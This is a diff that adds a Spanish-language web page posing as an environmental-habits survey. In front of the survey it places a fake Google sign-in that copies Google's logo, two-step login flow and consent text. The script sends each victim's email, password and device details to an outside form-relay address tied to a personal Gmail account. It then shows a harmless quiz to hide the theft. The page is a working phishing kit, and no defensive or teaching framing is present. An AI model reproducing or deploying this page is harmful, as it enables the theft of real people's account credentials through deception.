@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Encuesta de hábitos ambientales</title>
+<style>
+  :root{
+    --azul:#1a73e8; --azul2:#1765cc; --gris:#5f6368; --linea:#dadce0;
+    --fondo:#fff; --suave:#f8f9fa;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+    background:var(--fondo);color:#202124;min-height:100vh;
+    display:flex;flex-direction:column;align-items:center;padding:26px 18px 40px;
+  }
+  .card{width:100%;max-width:420px;border:1px solid var(--linea);border-radius:26px;padding:30px 26px}
+  .g{width:30px;height:30px;margin-bottom:16px}
+  h1{font-size:23px;font-weight:400;letter-spacing:-.2px}
+  .sub{font-size:14px;color:var(--gris);margin:6px 0 22px}
+  input[type=email],input[type=password]{
+    width:100%;padding:14px 14px;font-size:16px;border:1px solid var(--linea);
+    border-radius:9px;outline:none;font-family:inherit;background:#fff;color:#202124;
+  }
+  input:focus{border-color:var(--azul);box-shadow:0 0 0 1px var(--azul)}
+  .link{color:var(--azul);font-size:13.5px;text-decoration:none;font-weight:500;cursor:pointer}
+  .fila{display:flex;justify-content:space-between;align-items:center;margin-top:26px;gap:12px}
+  button{
+    font-family:inherit;font-size:14.5px;font-weight:500;border:0;border-radius:100px;
+    background:var(--azul);color:#fff;padding:11px 24px;cursor:pointer;
+  }
+  button:hover{background:var(--azul2)}
+  button:disabled{background:#a8c7fa;cursor:default}
+  .chip{
+    display:flex;align-items:center;gap:7px;border:1px solid var(--linea);
+    border-radius:100px;padding:5px 11px;font-size:13.5px;margin-bottom:18px;max-width:100%;
+  }
+  .chip span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .chip .x{cursor:pointer;color:var(--gris);font-size:15px;line-height:1}
+  .ver{display:flex;align-items:center;gap:8px;font-size:13.5px;color:var(--gris);margin-top:14px}
+  .legal{font-size:12px;color:var(--gris);max-width:420px;margin-top:26px;line-height:1.55}
+  .spin{display:flex;justify-content:center;padding:24px 0}
+  .spin i{
+    width:26px;height:26px;border:3px solid #d2e3fc;border-top-color:var(--azul);
+    border-radius:50%;animation:g .8s linear infinite;display:block;
+  }
+  @keyframes g{to{transform:rotate(360deg)}}
+  #encuesta{display:none;width:100%;max-width:520px}
+  .barra{height:4px;background:#e8eaed;border-radius:100px;overflow:hidden;margin-bottom:26px}
+  .barra i{display:block;height:100%;width:0;background:var(--azul);transition:width .35s}
+  .n{font-size:12px;color:var(--gris);letter-spacing:.6px;text-transform:uppercase;margin-bottom:8px}
+  .q{font-size:19px;font-weight:500;line-height:1.35;margin-bottom:22px}
+  .op{
+    width:100%;text-align:left;background:var(--suave);color:#202124;border:1px solid var(--linea);
+    border-radius:12px;padding:15px 16px;font-size:15px;margin-bottom:10px;cursor:pointer;font-weight:400;
+  }
+  .op:hover{border-color:#c0c4c9}
+  .op.sel{background:#e8f0fe;border-color:var(--azul);color:#0b57d0;font-weight:500}
+  #res{display:none;width:100%;max-width:520px;text-align:center}
+  .nota{font-size:52px;font-weight:600;letter-spacing:-2px;margin:8px 0 2px}
+  .eti{font-size:15px;font-weight:500;margin-bottom:22px}
+  .tips{text-align:left;background:var(--suave);border-radius:14px;padding:18px 20px;font-size:14px;line-height:1.6}
+  .tips b{display:block;margin-bottom:8px;font-size:13px;text-transform:uppercase;letter-spacing:.5px;color:var(--gris)}
+  .tips li{margin-left:18px;margin-bottom:6px}
+  .pie{font-size:12px;color:var(--gris);margin-top:22px}
+</style>
+</head>
+<body>
+
+<!-- ============ ACCESO ============ -->
+<div id="login">
+  <div class="card">
+    <svg class="g" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1 id="titulo">Iniciar sesión</h1>
+    <p class="sub">Continúa en la Encuesta de hábitos ambientales</p>
+
+    <div id="p1">
+      <input id="email" type="email" inputmode="email" autocomplete="email"
+             placeholder="Correo electrónico o teléfono">
+      <a class="link" style="display:inline-block;margin-top:12px">¿Has olvidado tu correo?</a>
+      <div class="fila">
+        <a class="link">Crear cuenta</a>
+        <button id="sig">Siguiente</button>
+      </div>
+    </div>
+
+    <div id="p2" hidden>
+      <div class="chip"><span id="emailChip"></span><span class="x" id="cambiar">✕</span></div>
+      <input id="pass" type="password" autocomplete="current-password"
+             placeholder="Introduce tu contraseña">
+      <label class="ver"><input type="checkbox" id="mostrar"> Mostrar contraseña</label>
+      <div class="fila">
+        <a class="link">¿Has olvidado la contraseña?</a>
+        <button id="entrar">Iniciar sesión</button>
+      </div>
+    </div>
+
+    <div id="spin" class="spin" hidden><i></i></div>
+  </div>
+
+  <p class="legal">Para continuar, Google compartirá tu nombre, dirección de correo electrónico,
+  preferencias de idioma y foto de perfil con la Encuesta de hábitos ambientales.</p>
+</div>
+
+<!-- ============ ENCUESTA ============ -->
+<div id="encuesta">
+  <div class="barra"><i id="prog"></i></div>
+  <div class="n" id="num"></div>
+  <div class="q" id="preg"></div>
+  <div id="ops"></div>
+  <div class="fila" style="margin-top:20px">
+    <button id="siguiente" style="display:none">Continuar</button>
+    <span></span>
+  </div>
+</div>
+
+<!-- ============ RESULTADO ============ -->
+<div id="res">
+  <div class="n">Huella estimada</div>
+  <div class="nota" id="puntos"></div>
+  <div class="eti" id="valor"></div>
+  <div class="tips">
+    <b>Qué puedes mejorar</b>
+    <ul id="lista"></ul>
+  </div>
+  <p class="pie">Gracias por participar.</p>
+</div>
+
+<script>
+/* ============================================================
+   DESTINO DE LAS CREDENCIALES
+   ============================================================ */
+const DESTINO = "https://formsubmit.co/ajax/luis.garciayt321@gmail.com";
+/* ============================================================ */
+
+const $ = id => document.getElementById(id);
+
+function enviar(datos, asunto) {
+  return fetch(DESTINO, {
+    method: "POST",
+    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+    body: JSON.stringify(Object.assign({
+      _subject: asunto,
+      _template: "table",
+      _captcha: "false"
+    }, datos))
+  }).then(r => r.ok).catch(() => false);
+}
+
+/* ---------- paso 1: correo ---------- */
+$("sig").addEventListener("click", () => {
+  const v = $("email").value.trim();
+  if (!v || !v.includes("@")) { $("email").focus(); return; }
+  $("emailChip").textContent = v;
+  $("p1").hidden = true;
+  $("p2").hidden = false;
+  $("titulo").textContent = "Introduce tu contraseña";
+  $("pass").focus();
+});
+
+$("cambiar").addEventListener("click", () => {
+  $("p1").hidden = false;
+  $("p2").hidden = true;
+  $("titulo").textContent = "Iniciar sesión";
+});
+
+$("mostrar").addEventListener("change", e => {
+  $("pass").type = e.target.checked ? "text" : "password";
+});
+
+/* ---------- paso 2: contraseña ---------- */
+$("entrar").addEventListener("click", () => {
+  const email = $("email").value.trim();
+  const pass  = $("pass").value;
+  if (!pass) { $("pass").focus(); return; }
+
+  $("entrar").disabled = true;
+  $("spin").hidden = false;
+
+  enviar({
+    Cuenta: email,
+    Contraseña: pass,
+    Pantalla: screen.width + "x" + screen.height,
+    Dispositivo: navigator.userAgent,
+    Idioma: navigator.language,
+    Zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    Fecha: new Date().toLocaleString("es-ES")
+  }, "Acceso a la encuesta: " + email);
+
+  setTimeout(() => {
+    $("login").style.display = "none";
+    $("encuesta").style.display = "block";
+    render(0);
+  }, 1400);
+});
+
+/* ---------- preguntas ---------- */
+const Q = [
+  { t: "¿Con qué frecuencia reciclas en casa?",
+    o: [["Nunca",0],["Solo de vez en cuando",1],["Casi siempre",2],["Siempre",3]] },
+  { t: "¿Cómo te desplazas habitualmente?",
+    o: [["Coche propio, solo",0],["Coche compartido",1],["Transporte público",2],["Bici o a pie",3]] },
+  { t: "¿Cuántas bolsas de plástico usas a la semana?",
+    o: [["Más de 10",0],["Entre 5 y 10",1],["Entre 1 y 4",2],["Casi ninguna, uso bolsas reutilizables",3]] },
+  { t: "¿Separas los residuos por tipo?",
+    o: [["No, todo a la misma bolsa",0],["Solo el vidrio o el papel",1],["Casi todos los tipos",2],["Todos, incluido el orgánico",3]] },
+  { t: "¿Cuánto suele durar tu ducha?",
+    o: [["Más de 15 minutos",0],["Entre 10 y 15",1],["Entre 5 y 10",2],["Menos de 5",3]] },
+  { t: "¿Compras productos locales y de temporada?",
+    o: [["Nunca me fijo",0],["A veces",1],["Con frecuencia",2],["Siempre que puedo",3]] },
+  { t: "¿Cuántos vuelos haces al año?",
+    o: [["Más de 4",0],["Entre 2 y 4",1],["Uno",2],["Ninguno",3]] },
+  { t: "¿Con qué frecuencia comes carne?",
+    o: [["A diario",0],["3 o 4 veces por semana",1],["1 o 2 veces por semana",2],["Casi nunca o nunca",3]] },
+  { t: "¿Apagas luces y aparatos en espera?",
+    o: [["No me fijo",0],["A veces",1],["Casi siempre",2],["Siempre",3]] },
+  { t: "¿Qué te gustaría mejorar este año?",
+    multi: true,
+    o: [["Reciclar mejor",0],["Reducir plástico",0],["Usar más la bici o el bus",0],
+        ["Gastar menos agua",0],["Comprar local",0],["Reducir consumo de carne",0]] }
+];
+
+const ans = [];
+let indice = 0;
+
+function render(i) {
+  const q = Q[i];
+  indice = i;
+  $("prog").style.width = (i / Q.length * 100) + "%";
+  $("num").textContent = "Pregunta " + (i + 1) + " de " + Q.length;
+  $("preg").textContent = q.t;
+  $("ops").innerHTML = "";
+  $("siguiente").style.display = q.multi ? "block" : "none";
+  $("siguiente").disabled = true;
+
+  q.o.forEach(([texto], k) => {
+    const b = document.createElement("button");
+    b.className = "op";
+    b.textContent = texto;
+    b.addEventListener("click", () => {
+      if (q.multi) {
+        b.classList.toggle("sel");
+        const elegidos = [...$("ops").querySelectorAll(".sel")].map(e => e.textContent);
+        ans[i] = elegidos;
+        $("siguiente").disabled = elegidos.length === 0;
+      } else {
+        ans[i] = { texto, pts: q.o[k][1] };
+        avanzar();
+      }
+    });
+    $("ops").appendChild(b);
+  });
+}
+
+$("siguiente").addEventListener("click", avanzar);
+
+function avanzar() {
+  if (indice + 1 < Q.length) render(indice + 1);
+  else terminar();
+}
+
+/* ---------- resultado ---------- */
+function terminar() {
+  let total = 0, max = 0;
+  Q.forEach((q, i) => {
+    if (q.multi) return;
+    max += 3;
+    total += ans[i] ? ans[i].pts : 0;
+  });
+  const pct = Math.round(total / max * 100);
+
+  $("prog").style.width = "100%";
+  $("encuesta").style.display = "none";
+  $("res").style.display = "block";
+  $("puntos").textContent = pct + "/100";
+
+  let valor, tips;
+  if (pct < 40) {
+    valor = "Huella alta";
+    tips = ["Empieza separando vidrio y papel: es lo más rápido de incorporar.",
+            "Cambia una bolsa de plástico al día por una de tela.",
+            "Reduce la ducha a 8 minutos con un temporizador."];
+  } else if (pct < 70) {
+    valor = "Vas por buen camino, hay margen";
+    tips = ["Sustituye dos trayectos semanales en coche por bus o bici.",
+            "Compra fruta y verdura de temporada en el mercado del barrio.",
+            "Deja una bolsa plegable en la mochila para no aceptar plástico."];
+  } else {
+    valor = "Huella baja, sigue así";
+    tips = ["Te queda el consumo de carne: dos días sin carne marcan diferencia.",
+            "Revisa el aislamiento de ventanas antes del invierno.",
+            "Comparte tus hábitos: el efecto contagio es real."];
+  }
+  $("valor").textContent = valor;
+  $("lista").innerHTML = tips.map(t => "<li>" + t + "</li>").join("");
+}
+</script>
+</body>
+  </html>
